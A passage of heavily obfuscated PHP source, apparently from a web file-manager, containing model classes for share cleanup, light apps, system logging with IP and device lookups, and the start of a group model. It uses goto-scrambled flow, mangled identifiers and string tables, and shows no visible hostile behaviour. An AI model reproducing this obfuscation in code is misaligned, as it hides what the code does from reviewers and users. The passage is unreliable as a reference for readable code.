$B‘‹†íòØá->updateFileEnd($aĞ”«»Ñõê[$cä¼»¢ÆŸì[38]], $aĞ”«»Ñõê[$cä¼»¢ÆŸì[88]]); continue; } goto E¸ùåÍÚÉÎ; cº¤Ïˆˆ: $DäÏó­¡ÆÎ = array($cä¼»¢ÆŸì[814] => $eÒ¦éÍó†³, $cä¼»¢ÆŸì[86] => $b‚Ù—ğÙ¿ƒ); Model($cä¼»¢ÆŸì[203])->where($eçšòäğå)->save($DäÏó­¡ÆÎ); goto a·Ø‡Óƒà; a·Ø‡Óƒà: } $this->removeByFileID($Bƒîøâ–Œ ); goto D‰×¥¡¹à®; aˆ†½‚©ÀÏ: $B‘‹†íòØá->task[$cä¼»¢ÆŸì[753]] = (double) $D‡öš²ÛŠÎ; $DÍå÷ì÷‹ë = KodIO::defaultDriver(); $eÒ¦éÍó†³ = $DÍå÷ì÷‹ë[$cä¼»¢ÆŸì[404]]; goto bäŠæ¥â; fİ¦¨òö¯¿: } public function progress($e²ö±Í‡, $fëøÄÇŸÎ‰) { return Task::get($fëøÄÇŸÎ‰ . $_SERVER[œÕÊİğö][2030] . $e²ö±Í‡); } private function removeByFileID($a¨šô›äõ = array()) { goto Ağï¬Û£«¦; C–Ğ˜õ¹¥: foreach ($AÜÙ›‚ª‰‡ as $f·ƒŞ¥ö­) { Model($FÊ–®Åï[420])->removeNow($f·ƒŞ¥ö­, !1); } goto D·Å‰´Ãå; Ağï¬Û£«¦: $FÊ–®Åï =& $_SERVER[œÕÊİğö]; if (empty($a¨šô›äõ)) { return; } $a†½ùô®îÎ = array($FÊ–®Åï[470] => array($FÊ–®Åï[7], $a¨šô›äõ)); goto B…ŞƒğÛÁò; B…ŞƒğÛÁò: $AÜÙ›‚ª‰‡ = Model($FÊ–®Åï[1228])->where($a†½ùô®îÎ)->field($FÊ–®Åï[406])->select(); if (!$AÜÙ›‚ª‰‡) { return; } $AÜÙ›‚ª‰‡ = array_to_keyvalue($AÜÙ›‚ª‰‡, $FÊ–®Åï[43], $FÊ–®Åï[406]); goto C–Ğ˜õ¹¥; D·Å‰´Ãå: } private function removeShareItems($DíŠ¨¸œé) { goto E¨ËÚÖµ¾Š; E¨ËÚÖµ¾Š: $D¹ƒİàõ‹µ =& $_SERVER[œÕÊİğö]; $D§’¯Ò‹É = "\x7b\151\157\x3a{$DíŠ¨¸œé}\175\x2f"; $cÜ¬ÍéÙ¸Å = array($D¹ƒİàõ‹µ[406] => 0, $D¹ƒİàõ‹µ[1093] => array($D¹ƒİàõ‹µ[390], "{$D§’¯Ò‹É}\x25")); goto bÒí†›Ûå; E¨‹Òå÷Â: Model($D¹ƒİàõ‹µ[598])->remove($e°ç¯Ô„†); goto Dµ£³»Ğ¸; bÒí†›Ûå: $eäÛİ£Ò…Ï = Model($D¹ƒİàõ‹µ[1697])->where($cÜ¬ÍéÙ¸Å)->field($D¹ƒİàõ‹µ[491])->select(); if (empty($eäÛİ£Ò…Ï)) { return; } $e°ç¯Ô„† = array_to_keyvalue($eäÛİ£Ò…Ï, $D¹ƒİàõ‹µ[43], $D¹ƒİàõ‹µ[491]); goto E¨‹Òå÷Â; Dµ£³»Ğ¸: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\114\151\147\150\x74\101\160\160"; public $modelType = "\x53\x79\x73\x74\145\x6d\x4f\160\x74\x69\157\x6e"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\160", "\144\x65\x73\143", "\x63\157\x6e\x74\x65\x6e\164"); public function listData($aÙ®Ñ‹Æ¥à = false, $F¯ÖÛäÌ¦ = "\x6d\x6f\x64\x69\x66\171\x54\151\155\145", $bÙ°˜ñ = true) { return parent::listData($aÙ®Ñ‹Æ¥à, $F¯ÖÛäÌ¦, $bÙ°˜ñ); } public function remove($f‡ó’ƒÜ±›) { $a…°è‘Ğ‘ = $this->findByName($f‡ó’ƒÜ±›); if (!$a…°è‘Ğ‘) { return !1; } return parent::remove($a…°è‘Ğ‘[$_SERVER[œÕÊİğö][404]]); } public function add($BÓ»Ÿ¦–ØĞ) { if ($this->findByName($BÓ»Ÿ¦–ØĞ[$_SERVER[œÕÊİğö][38]])) { return !1; } return parent::insert($BÓ»Ÿ¦–ØĞ); } public function update($aôõ¤—¸ò, $eÃĞËÓß„) { $aŠ§šÕæ…÷ =& $_SERVER[œÕÊİğö]; $DÀ°Åâ ¶¢ = $this->findByName($aôõ¤—¸ò); $B¾ä–´… = $this->findByName($eÃĞËÓß„[$aŠ§šÕæ…÷[38]]); if (!$DÀ°Åâ ¶¢ || $B¾ä–´… && $B¾ä–´…[$aŠ§šÕæ…÷[404]] != $DÀ°Åâ ¶¢[$aŠ§šÕæ…÷[404]]) { return !1; } return parent::update($DÀ°Åâ ¶¢[$aŠ§šÕæ…÷[404]], $eÃĞËÓß„); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\124\151\155\x65", "\x74\151\155\145", "\x69\x6e\163\145\162\x74", "\146\165\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $eŒ±â·î¤ =& $_SERVER[œÕÊİğö]; return array($eŒ±â·î¤[2033] => LNG($eŒ±â·î¤[2034]), $eŒ±â·î¤[2035] => LNG($eŒ±â·î¤[2036]), $eŒ±â·î¤[1660] => LNG($eŒ±â·î¤[2037]), $eŒ±â·î¤[2038] => LNG($eŒ±â·î¤[2039]), $eŒ±â·î¤[2040] => LNG($eŒ±â·î¤[2041]), $eŒ±â·î¤[2042] => LNG($eŒ±â·î¤[2043]), $eŒ±â·î¤[2044] => LNG($eŒ±â·î¤[2045]), $eŒ±â·î¤[1690] => LNG($eŒ±â·î¤[2045]), $eŒ±â·î¤[1691] => LNG($eŒ±â·î¤[2046]), $eŒ±â·î¤[2047] => LNG($eŒ±â·î¤[2048]), $eŒ±â·î¤[2049] => LNG($eŒ±â·î¤[2050]), $eŒ±â·î¤[2051] => LNG($eŒ±â·î¤[2052]), $eŒ±â·î¤[2053] => LNG($eŒ±â·î¤[2054]), $eŒ±â·î¤[1688] => LNG($eŒ±â·î¤[2055]), $eŒ±â·î¤[2056] => LNG($eŒ±â·î¤[2057]), $eŒ±â·î¤[1695] => LNG($eŒ±â·î¤[2058]), $eŒ±â·î¤[2059] => LNG($eŒ±â·î¤[2060]), $eŒ±â·î¤[2061] => LNG($eŒ±â·î¤[2062]), $eŒ±â·î¤[2063] => LNG($eŒ±â·î¤[2064]), $eŒ±â·î¤[2065] => LNG($eŒ±â·î¤[2066]), $eŒ±â·î¤[1698] => LNG($eŒ±â·î¤[2067]), $eŒ±â·î¤[1699] => LNG($eŒ±â·î¤[2068]), $eŒ±â·î¤[2069] => LNG($eŒ±â·î¤[2070]), $eŒ±â·î¤[2071] => LNG($eŒ±â·î¤[2072]), $eŒ±â·î¤[2073] => LNG($eŒ±â·î¤[2074]), $eŒ±â·î¤[1693] => LNG($eŒ±â·î¤[2075]), $eŒ±â·î¤[2076] => LNG($eŒ±â·î¤[2077]), $eŒ±â·î¤[1692] => LNG($eŒ±â·î¤[2078]), $eŒ±â·î¤[2079] => LNG($eŒ±â·î¤[2080]), $eŒ±â·î¤[2081] => LNG($eŒ±â·î¤[2082]), $eŒ±â·î¤[2083] => LNG($eŒ±â·î¤[2084]), $eŒ±â·î¤[2085] => LNG($eŒ±â·î¤[2085]), $eŒ±â·î¤[2086] => LNG($eŒ±â·î¤[1664]), $eŒ±â·î¤[2087] => LNG($eŒ±â·î¤[2088]), $eŒ±â·î¤[2089] => LNG($eŒ±â·î¤[2090]), $eŒ±â·î¤[2091] => LNG($eŒ±â·î¤[2092]), $eŒ±â·î¤[2093] => LNG($eŒ±â·î¤[2094]), $eŒ±â·î¤[2095] => LNG($eŒ±â·î¤[2096]), $eŒ±â·î¤[2097] => LNG($eŒ±â·î¤[2097]), $eŒ±â·î¤[2098] => LNG($eŒ±â·î¤[2099]), $eŒ±â·î¤[2100] => LNG($eŒ±â·î¤[2101]), $eŒ±â·î¤[2102] => LNG($eŒ±â·î¤[2103]), $eŒ±â·î¤[2104] => LNG($eŒ±â·î¤[2105]), $eŒ±â·î¤[2106] => LNG($eŒ±â·î¤[2107]), $eŒ±â·î¤[2108] => LNG($eŒ±â·î¤[2109])); } private function typeFile() { $B˜ŞŸ¸ÓøÊ =& $_SERVER[œÕÊİğö]; $bùãŸ«¬ = array($B˜ŞŸ¸ÓøÊ[1695] => array($B˜ŞŸ¸ÓøÊ[1696]), $B˜ŞŸ¸ÓøÊ[2051] => array($B˜ŞŸ¸ÓøÊ[2110]), $B˜ŞŸ¸ÓøÊ[2053] => array($B˜ŞŸ¸ÓøÊ[2111]), $B˜ŞŸ¸ÓøÊ[1688] => array($B˜ŞŸ¸ÓøÊ[1689]), $B˜ŞŸ¸ÓøÊ[2061] => array(), $B˜ŞŸ¸ÓøÊ[2063] => array(), $B˜ŞŸ¸ÓøÊ[2065] => array(), $B˜ŞŸ¸ÓøÊ[1698] => array($B˜ŞŸ¸ÓøÊ[1700]), $B˜ŞŸ¸ÓøÊ[1699] => array($B˜ŞŸ¸ÓøÊ[1700]), $B˜ŞŸ¸ÓøÊ[2069] => array($B˜ŞŸ¸ÓøÊ[2112]), $B˜ŞŸ¸ÓøÊ[2071] => array($B˜ŞŸ¸ÓøÊ[2112]), $B˜ŞŸ¸ÓøÊ[2073] => array($B˜ŞŸ¸ÓøÊ[2113]), $B˜ŞŸ¸ÓøÊ[2059] => array($B˜ŞŸ¸ÓøÊ[2114]), $B˜ŞŸ¸ÓøÊ[1693] => array($B˜ŞŸ¸ÓøÊ[2115]), $B˜ŞŸ¸ÓøÊ[2076] => array($B˜ŞŸ¸ÓøÊ[2116]), $B˜ŞŸ¸ÓøÊ[1692] => array($B˜ŞŸ¸ÓøÊ[1694])); return $bùãŸ«¬; } private function typeAll() { goto c«ÔÒŠ‚™; c«ÔÒŠ‚™: $b®Ãî‘Ã„î =& $_SERVER[œÕÊİğö]; $béâƒÆÊğ§ = $this->typeList; $e‹ô¥ï±ß = array_filter($this->typeFile()); goto bÄïÌ…×£—; bÄïÌ…×£—: foreach ($e‹ô¥ï±ß as $EÔ·®”Ï·Î => $B§ù°éÇ˜‹) { $béâƒÆÊğ§[$B§ù°éÇ˜‹[0]] = $béâƒÆÊğ§[$EÔ·®”Ï·Î]; } $béâƒÆÊğ§[$b®Ãî‘Ã„î[1700]] = LNG($b®Ãî‘Ã„î[2117]); $béâƒÆÊğ§[$b®Ãî‘Ã„î[2112]] = LNG($b®Ãî‘Ã„î[2118]); goto fÛõÆ²—©¡; fÛõÆ²—©¡: return $béâƒÆÊğ§; goto e‹ÓŠ§“¾“; e‹ÓŠ§“¾“: } public function addLog($eÁò§‡ŸŸ™, $dçÃñ•çŠË = array()) { goto b£‚ÏŠÎ¦–; Eµ°ÒÄÓ‘: $dçÃñ•çŠË = array($AÇİğëø„õ[1541] => Session::sign(), $AÇİğëø„õ[1542] => $c¸æŠÔÆ×, $AÇİğëø„õ[39] => $eÁò§‡ŸŸ™, $AÇİğëø„õ[1544] => json_encode($dçÃñ•çŠË)); parent::add($dçÃñ•çŠË); goto B˜‡Ç¯Ùë–; b•Íëæ•¯ó: if (!$c¸æŠÔÆ×) { $c¸æŠÔÆ× = (int) Session::get($AÇİğëø„õ[1851]); } $F¶§‹ÍÎßö = get_client_ip(); if (!$dçÃñ•çŠË || strlen(json_encode($dçÃñ•çŠË)) >= 1024) { $dçÃñ•çŠË = array($AÇİğëø„õ[2119] => $F¶§‹ÍÎßö); } else { if (is_array($dçÃñ•çŠË)) { $dçÃñ•çŠË[$AÇİğëø„õ[2119]] = $F¶§‹ÍÎßö; } else { $dçÃñ•çŠË = array($AÇİğëø„õ[1110] => $dçÃñ•çŠË, $AÇİğëø„õ[2119] => $F¶§‹ÍÎßö); } } goto Eµ°ÒÄÓ‘; b£‚ÏŠÎ¦–: $AÇİğëø„õ =& $_SERVER[œÕÊİğö]; if (!isset($this->typeList[$eÁò§‡ŸŸ™])) { return; } $c¸æŠÔÆ× = defined($AÇİğëø„õ[477]) && USER_ID ? USER_ID : (isset($dçÃñ•çŠË[$AÇİğëø„õ[1551]]) ? $dçÃñ•çŠË[$AÇİğëø„õ[1551]] : 0); goto b•Íëæ•¯ó; B˜‡Ç¯Ùë–: } public function remove($dà’ô±‰£) { $this->where(array($_SERVER[œÕÊİğö][423] => $dà’ô±‰£))->delete(); } private function _makeOrder($C„«¦Ş°ª· = '') { goto aíñÕ“…®; E‡ º£¾ó¨: $C¯Ãí–ŠÈ° = Input::get($eÛåµÚÀ¾Ä[459], $eÛåµÚÀ¾Ä[7], $eÛåµÚÀ¾Ä[1883], array($eÛåµÚÀ¾Ä[1807], $eÛåµÚÀ¾Ä[453])); $C¯Ãí–ŠÈ° = $dÃ¬–¸ì‹[$C¯Ãí–ŠÈ°]; $C„«¦Ş°ª· = $C„«¦Ş°ª· . "{$AììœóËğ«}\40{$C¯Ãí–ŠÈ°}"; goto C¿œÖ¾¡Ç; aíñÕ“…®: $eÛåµÚÀ¾Ä =& $_SERVER[œÕÊİğö]; $AììœóËğ« = $eÛåµÚÀ¾Ä[204]; $dÃ¬–¸ì‹ = array($eÛåµÚÀ¾Ä[451] => $eÛåµÚÀ¾Ä[452], $eÛåµÚÀ¾Ä[453] => $eÛåµÚÀ¾Ä[454]); goto E‡ º£¾ó¨; C¿œÖ¾¡Ç: return $this->order($C„«¦Ş°ª·); goto bñ­ÖĞóÁŞ; bñ­ÖĞóÁŞ: } public function get($Eæ‡¦Ş‰” = '') { goto A¶ïºĞ‚Ÿ; F—ßà‘¹Ÿ: if (!empty($Eæ‡¦Ş‰”[$B§›µ„„‰È[2119]])) { $aÆ¤ˆâ†£[$B§›µ„„‰È[454]] = array($B§›µ„„‰È[390], "\x25{$Eæ‡¦Ş‰”[$B§›µ„„‰È[2119]]}\45"); } $D¢ÍªäŒ‰ = $this->_makeOrder()->where($aÆ¤ˆâ†£)->selectPage(); if (empty($D¢ÍªäŒ‰[$B§›µ„„‰È[377]])) { show_json(array(), !0, $D¢ÍªäŒ‰[$B§›µ„„‰È[374]]); } goto EÜå‚¸ƒÔœ; EÜå‚¸ƒÔœ: $D¢ÍªäŒ‰[$B§›µ„„‰È[377]] = $this->logList($D¢ÍªäŒ‰[$B§›µ„„‰È[377]]); return $D¢ÍªäŒ‰; goto b¨Ã‚ğŸ¾¾; B³øŞŠ¥ì÷: if ($Eæ‡¦Ş‰”[$B§›µ„„‰È[1551]]) { $aÆ¤ˆâ†£[$B§›µ„„‰È[1551]] = $Eæ‡¦Ş‰”[$B§›µ„„‰È[1551]]; } if (isset($Eæ‡¦Ş‰”[$B§›µ„„‰È[751]])) { $fñ®¨¸°ñ = $Eæ‡¦Ş‰”[$B§›µ„„‰È[751]]; $DÜÈåÑÍ  = isset($Eæ‡¦Ş‰”[$B§›µ„„‰È[499]]) ? $Eæ‡¦Ş‰”[$B§›µ„„‰È[499]] : time(); $aÆ¤ˆâ†£[$B§›µ„„‰È[204]] = array($B§›µ„„‰È[341], array($fñ®¨¸°ñ, $DÜÈåÑÍ )); } if ($Eæ‡¦Ş‰”[$B§›µ„„‰È[39]]) { $Cò»‡Èö£¢ = explode($B§›µ„„‰È[57], $Eæ‡¦Ş‰”[$B§›µ„„‰È[39]]); $c«ÍÄ§é¢¾ = $this->typeFile(); $a‹–õøáõ² = array(); foreach ($Cò»‡Èö£¢ as $E‰©Ø éâ) { $a‹–õøáõ²[] = $E‰©Ø éâ; if (isset($c«ÍÄ§é¢¾[$E‰©Ø éâ])) { $a‹–õøáõ² = array_merge($a‹–õøáõ², $c«ÍÄ§é¢¾[$E‰©Ø éâ]); } } $a‹–õøáõ² = array_unique($a‹–õøáõ²); if ($a‹–õøáõ²) { $aÆ¤ˆâ†£[$B§›µ„„‰È[39]] = array($B§›µ„„‰È[7], $a‹–õøáõ²); } } else { $aÆ¤ˆâ†£[$B§›µ„„‰È[39]] = array($B§›µ„„‰È[2120], $B§›µ„„‰È[2121]); } goto F—ßà‘¹Ÿ; A¶ïºĞ‚Ÿ: $B§›µ„„‰È =& $_SERVER[œÕÊİğö]; if (!$Eæ‡¦Ş‰”) { show_json(array()); } $aÆ¤ˆâ†£ = array(); goto B³øŞŠ¥ì÷; b¨Ã‚ğŸ¾¾: } private function ipAddress(&$c³ãÊËñäÜ) { $c¿Ï­×—… =& $_SERVER[œÕÊİğö]; if (!empty($c³ãÊËñäÜ[$c¿Ï­×—…[2119]])) { $D‚³ÁÊ¹±Æ = IpLocation::get($c³ãÊËñäÜ[$c¿Ï­×—…[2119]]); } else { $D‚³ÁÊ¹±Æ = LNG($c¿Ï­×—…[2122]); } $c³ãÊËñäÜ[$c¿Ï­×—…[2123]] = $D‚³ÁÊ¹±Æ; } private function descZipDownload($d³Ôá»ÃÄ, &$d˜ÕÏ„™¼ì) { $e˜ÀË„Æâ =& $_SERVER[œÕÊİğö]; if (!isset($d³Ôá»ÃÄ[$e˜ÀË„Æâ[2124]])) { return; } $bù¢Ó¶¢·¶ = json_decode($d³Ôá»ÃÄ[$e˜ÀË„Æâ[2124]], !0); foreach ($bù¢Ó¶¢·¶ as $e‰äùè´ø) { try { $Aí¨ŒÍ¿šØ = IO::infoFull($e‰äùè´ø[$e˜ÀË„Æâ[86]]); } catch (Exception $F¾ï±ÇÈĞ) { continue; } $d³Ôá»ÃÄ[$e˜ÀË„Æâ[86]] = $e‰äùè´ø[$e˜ÀË„Æâ[86]]; $d˜ÕÏ„™¼ì[] = $d³Ôá»ÃÄ[$e˜ÀË„Æâ[406]] = $Aí¨ŒÍ¿šØ[$e˜ÀË„Æâ[406]]; $d˜ÕÏ„™¼ì[] = $d³Ôá»ÃÄ[$e˜ÀË„Æâ[1937]] = $Aí¨ŒÍ¿šØ[$e˜ÀË„Æâ[501]]; break; } return $d³Ôá»ÃÄ; } private function getSourceList(&$aÄîì•Ü…ò) { $c¼ÔÅ„‡˜¨ =& $_SERVER[œÕÊİğö]; $BÃØ¸Á¨ÜÅ = array(); foreach ($aÄîì•Ü…ò as $cÈç®‹Ôäè => $b‰Şì‘Ó¡¢) { goto E¸Ü´ò–ÉŸ; fÔ› ·ƒğñ: if ($b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[39]] == $c¼ÔÅ„‡˜¨[1945]) { $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[454]][$c¼ÔÅ„‡˜¨[406]]; } goto Aî¯‹¢ÄÛğ; E¸Ü´ò–ÉŸ: $b¦ã•ÚÀ® = json_decode($b‰Şì‘Ó¡¢[$c¼ÔÅ„‡˜¨[454]], !0); if ($b‰Şì‘Ó¡¢[$c¼ÔÅ„‡˜¨[39]] == $c¼ÔÅ„‡˜¨[1691]) { $b¦ã•ÚÀ® = $this->descZipDownload($b¦ã•ÚÀ®, $BÃØ¸Á¨ÜÅ); $aÄîì•Ü…ò[$cÈç®‹Ôäè][$c¼ÔÅ„‡˜¨[454]] = json_encode($b¦ã•ÚÀ®); continue; } if (strpos($b‰Şì‘Ó¡¢[$c¼ÔÅ„‡˜¨[39]], $c¼ÔÅ„‡˜¨[1938]) !== 0) { if (!isset($b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[86]]) || strpos($b‰Şì‘Ó¡¢[$c¼ÔÅ„‡˜¨[39]], $c¼ÔÅ„‡˜¨[2125]) !== 0) { continue; } try { $CÙµÑ²óê” = IO::infoFull($b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[86]]); } catch (Exception $Fâ´Âƒ™†) { continue; } $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[406]] = $CÙµÑ²óê”[$c¼ÔÅ„‡˜¨[406]]; $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[1937]] = $CÙµÑ²óê”[$c¼ÔÅ„‡˜¨[501]]; $aÄîì•Ü…ò[$cÈç®‹Ôäè][$c¼ÔÅ„‡˜¨[454]] = json_encode($b¦ã•ÚÀ®); continue; } goto d’‹£ÛÎÃµ; d’‹£ÛÎÃµ: $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[406]]; $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[1937]]; if ($b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[39]] == $c¼ÔÅ„‡˜¨[554]) { $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[454]][$c¼ÔÅ„‡˜¨[1077]]; $BÃØ¸Á¨ÜÅ[] = $b¦ã•ÚÀ®[$c¼ÔÅ„‡˜¨[454]][$c¼ÔÅ„‡˜¨[1078]]; } goto fÔ› ·ƒğñ; Aî¯‹¢ÄÛğ: } if (!$BÃØ¸Á¨ÜÅ) { return array(); } return Model($c¼ÔÅ„‡˜¨[822])->sourceListInfo($BÃØ¸Á¨ÜÅ, !0); } private function logList($d¾é¬Óëè) { goto b•¿ò­Îá¹; fÑÄÓ‡ŞŠõ: return $fìÆéÌÆóÀ; goto Fºæ¼£é„»; b•¿ò­Îá¹: $Fï„øøùçô =& $_SERVER[œÕÊİğö]; $A‰ìç¯Äåù = array_to_keyvalue($d¾é¬Óëè, $Fï„øøùçô[43], $Fï„øøùçô[1551]); $dÃºÛãíÇë = Model($Fï„øøùçô[541])->userListInfo(array_unique($A‰ìç¯Äåù)); goto BœåùùŠÇƒ; BœåùùŠÇƒ: $Bø²ø£àô = $this->getSourceList($d¾é¬Óëè); $fÑ•ä·„Ú÷ = $this->typeAll(); $fìÆéÌÆóÀ = array(); goto aÍâ¥Ğ‘ÖÌ; aÍâ¥Ğ‘ÖÌ: $BÂĞŠ©‡¡Œ = array(); foreach ($d¾é¬Óëè as $eø¨í¹ÈÈ => $DÖ‚Š­ùïÏ) { goto fĞÙœ¡¿òÕ; fĞÙœ¡¿òÕ: $bà‚èñì²ˆ = $DÖ‚Š­ùïÏ[$Fï„øøùçô[39]]; $FÚ¾¹ÈÂß = isset($dÃºÛãíÇë[$DÖ‚Š­ùïÏ[$Fï„øøùçô[1551]]]) ? $dÃºÛãíÇë[$DÖ‚Š­ùïÏ[$Fï„øøùçô[1551]]] : !1; $Fˆòïºî¢ = strpos($bà‚èñì²ˆ, $Fï„øøùçô[2126]) === 0 ? LNG($Fï„øøùçô[2127]) : LNG($Fï„øøùçô[2122]); goto e½ó¦¥‹­; eÁÖ§¹¿ƒå: $DÖ‚Š­ùïÏ[$Fï„øøùçô[1882]] = $FÚ¾¹ÈÂß; $F¡£»¾Û = json_decode($DÖ‚Š­ùïÏ[$Fï„øøùçô[454]], !0); $DÖ‚Š­ùïÏ[$Fï„øøùçô[2119]] = isset($F¡£»¾Û[$Fï„øøùçô[2119]]) ? $F¡£»¾Û[$Fï„øøùçô[2119]] : $Fï„øøùçô[43]; goto FÓÄ‰ÜÎñ†; FÓÄ‰ÜÎñ†: $this->ipAddress($DÖ‚Š­ùïÏ); if (strpos($bà‚èñì²ˆ, $Fï„øøùçô[1938]) === 0 || isset($F¡£»¾Û[$Fï„øøùçô[1937]])) { goto a“­î¤¡ß…; a“­î¤¡ß…: $F¡£»¾Û[$Fï„øøùçô[95]] = $Bø²ø£àô[$F¡£»¾Û[$Fï„øøùçô[406]]]; $F¡£»¾Û[$Fï„øøùçô[1950]] = $Bø²ø£àô[$F¡£»¾Û[$Fï„øøùçô[1937]]]; if ($F¡£»¾Û[$Fï„øøùçô[39]] == $Fï„øøùçô[554]) { $F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[1077]] = $Bø²ø£àô[$F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[1077]]]; $F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[1078]] = $Bø²ø£àô[$F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[1078]]]; } goto eù‰ÀåÖ¢·; eù‰ÀåÖ¢·: if ($F¡£»¾Û[$Fï„øøùçô[39]] == $Fï„øøùçô[1945]) { $F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[406]] = $Bø²ø£àô[$F¡£»¾Û[$Fï„øøùçô[454]][$Fï„øøùçô[406]]]; } if ($F¡£»¾Û[$Fï„øøùçô[39]] == $Fï„øøùçô[1686]) { $F¡£»¾Û[$Fï„øøùçô[1950]] = $F¡£»¾Û[$Fï„øøùçô[95]]; $F¡£»¾Û[$Fï„øøùçô[1937]] = $F¡£»¾Û[$Fï„øøùçô[1950]][$Fï„øøùçô[406]]; $F¡£»¾Û[$Fï„øøùçô[95]] = !1; $F¡£»¾Û[$Fï„øøùçô[406]] = $Fï„øøùçô[43]; } if ($F¡£»¾Û[$Fï„øøùçô[95]] && $F¡£»¾Û[$Fï„øøùçô[95]][$Fï„øøùçô[415]] == $Fï„øøùçô[1193]) { $BÂĞŠ©‡¡Œ[] = $DÖ‚Š­ùïÏ[$Fï„øøùçô[404]]; unset($d¾é¬Óëè[$eø¨í¹ÈÈ]); continue; } goto eÆ…Ç‹‘¹±; eÆ…Ç‹‘¹±: if ($F¡£»¾Û[$Fï„øøùçô[1950]] && $F¡£»¾Û[$Fï„øøùçô[1950]][$Fï„øøùçô[415]] == $Fï„øøùçô[1193]) { $BÂĞŠ©‡¡Œ[] = $DÖ‚Š­ùïÏ[$Fï„øøùçô[404]]; unset($d¾é¬Óëè[$eø¨í¹ÈÈ]); continue; } goto FÓŒÀÚ ø„; FÓŒÀÚ ø„: } $DÖ‚Š­ùïÏ[$Fï„øøùçô[454]] = $F¡£»¾Û; goto aÛ¨¯²ÆÍ—; aÛ¨¯²ÆÍ—: unset($DÖ‚Š­ùïÏ[$Fï„øøùçô[2128]]); $fìÆéÌÆóÀ[] = $DÖ‚Š­ùïÏ; goto cé…œ÷î¶¸; e½ó¦¥‹­: $DÖ‚Š­ùïÏ[$Fï„øøùçô[38]] = isset($FÚ¾¹ÈÂß[$Fï„øøùçô[38]]) ? $FÚ¾¹ÈÂß[$Fï„øøùçô[38]] : LNG($Fï„øøùçô[2122]); $DÖ‚Š­ùïÏ[$Fï„øøùçô[1985]] = isset($FÚ¾¹ÈÂß[$Fï„øøùçô[1985]]) ? $FÚ¾¹ÈÂß[$Fï„øøùçô[1985]] : $Fï„øøùçô[43]; $DÖ‚Š­ùïÏ[$Fï„øøùçô[1452]] = isset($fÑ•ä·„Ú÷[$bà‚èñì²ˆ]) ? $fÑ•ä·„Ú÷[$bà‚èñì²ˆ] : $Fˆòïºî¢; goto eÁÖ§¹¿ƒå; cé…œ÷î¶¸: } $this->clearSystemPathLog($BÂĞŠ©‡¡Œ); goto fÑÄÓ‡ŞŠõ; Fºæ¼£é„»: } private function clearSystemPathLog($d—Ù‘êõ”õ) { $A¤Š‚‚¯Àå =& $_SERVER[œÕÊİğö]; if (count($d—Ù‘êõ”õ) == 0) { return; } $b¸Ûáƒ·×¯ = array($A¤Š‚‚¯Àå[404] => array($A¤Š‚‚¯Àå[7], array_unique($d—Ù‘êõ”õ))); $this->where($b¸Ûáƒ·×¯)->delete(); } public function deviceList($e›‚»ÒÓÍ·, $eìì¢ÒŒî© = 0) { $e‘–èŠÃ÷³ =& $_SERVER[œÕÊİğö]; $f¿Ú¢Òœ®ô = array($e‘–èŠÃ÷³[1551] => $e›‚»ÒÓÍ·, $e‘–èŠÃ÷³[204] => array($e‘–èŠÃ÷³[995], $eìì¢ÒŒî©), $e‘–èŠÃ÷³[39] => $e‘–èŠÃ÷³[1660]); $C›ôÒ•± = array(); $aİ¼ÌÃÂ‘– = $this->field($e‘–èŠÃ÷³[2129])->where($f¿Ú¢Òœ®ô)->order($e‘–èŠÃ÷³[1948])->limit(50)->select(); foreach ($aİ¼ÌÃÂ‘– as $dîµÃ·¾Œ‹ => $eç¬İ˜Ì—) { goto aˆ¿ …•ĞĞ; Cš¯–Óç: $this->ipAddress($eç¬İ˜Ì—); $eç¬İ˜Ì—[$e‘–èŠÃ÷³[454]] = $bÒŠ«ÜŠ; $C›ôÒ•±[$b‡Ò·¨Æõ] = $eç¬İ˜Ì—; goto D•ÑŠÖ±; Fç­„Åê®µ: unset($bÒŠ«ÜŠ[$e‘–èŠÃ÷³[2119]]); $b‡Ò·¨Æõ = $this->deviceType($bÒŠ«ÜŠ[$e‘–èŠÃ÷³[1939]]); if (isset($C›ôÒ•±[$b‡Ò·¨Æõ])) { continue; } goto Cš¯–Óç; aˆ¿ …•ĞĞ: if ($dîµÃ·¾Œ‹ > 0 && abs($eç¬İ˜Ì—[$e‘–èŠÃ÷³[204]] - $aİ¼ÌÃÂ‘–[$dîµÃ·¾Œ‹ - 1][$e‘–èŠÃ÷³[204]]) < 5) { continue; } $bÒŠ«ÜŠ = json_decode($eç¬İ˜Ì—[$e‘–èŠÃ÷³[454]], !0); $eç¬İ˜Ì—[$e‘–èŠÃ÷³[2119]] = isset($bÒŠ«ÜŠ[$e‘–èŠÃ÷³[2119]]) ? $bÒŠ«ÜŠ[$e‘–èŠÃ÷³[2119]] : $e‘–èŠÃ÷³[43]; goto Fç­„Åê®µ; D•ÑŠÖ±: } return array_values($C›ôÒ•±); } public function deviceType($EãíÉ–ô£) { return $EãíÉ–ô£; } } goto dğÇî¹ªíİ; b›”·ˆ‡¿Ö: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = 